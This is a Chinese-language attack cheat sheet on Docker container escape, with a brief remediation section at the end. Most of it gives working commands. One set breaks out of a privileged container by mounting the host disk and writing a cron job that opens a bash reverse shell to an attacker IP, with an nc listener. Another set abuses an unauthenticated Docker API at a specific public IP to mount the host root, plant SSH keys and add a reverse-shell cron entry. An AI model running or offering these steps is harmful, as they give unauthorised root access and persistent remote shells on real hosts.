
# docker 逃逸

启动时如果添加了 `--privileged` 参数，就会以特权模式启动docker，具备所有的Capabilities

```shell
# 1.1 方式1 查看是否在 docker中
ls -alh /.dockerenv
# 1.2 方式2
cat /proc/self/status|grepCapEff
## CapEff: 0000003fffffffff -- 以特权模式的

$ fdisk -l
# * Linux 表示是宿主机
## 如果通过特权模式启动容器，docker run --privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。
/dev/sda1  *        2048 16779263 16777216   8G 83 Linux


mkdir /test
mount /dev/sda1 /test

vi /test/tmp/test.sh
/bin/bash -i >& /dev/tcp/192.168.50.161/7777 0>&1 
#:wq 保存

# 攻击机
nc -lvp 7777

# 写入 crontab
sed -i '$a*/2 *    * * *    root  bash /tmp/test.sh ' /test/etc/crontab

# 或者写入authorized_keys 然后ssh
```

## docker 未授权

访问 http://your-ip:2375/version
```sh
docker -H tcp://47.92.7.138:2375 images
docker -H tcp://47.92.7.138:2375 ps -a
# 启动容器并将宿主机磁盘挂载到/mnt
docker -H tcp://47.92.7.138:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
cd /mnt/root/.ssh/
echo "ssh-rsa AAAAB3NzaC1yc2......." > authorized_keys

# 反弹shell -- 可通过 crontab -e 写入定时任务
* * * * * /bin/sh -i >& /dev/tcp/xxx.xxx.xxx.xxx./1111 0>&1
```


# 0x04 修复建议

1、对 2375 端口做网络访问控制，如 ACL 控制，或者访问规则；

2、修改 docker swarm 的认证方式，使用 TLS 认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS 这两篇文档，说的是配置好 TLS 后，Docker CLI 在发送命令到 docker daemon 之前，会首先发送它的证书，如果证书是由 daemon 信任的 CA 所签名的，才可以继续执行。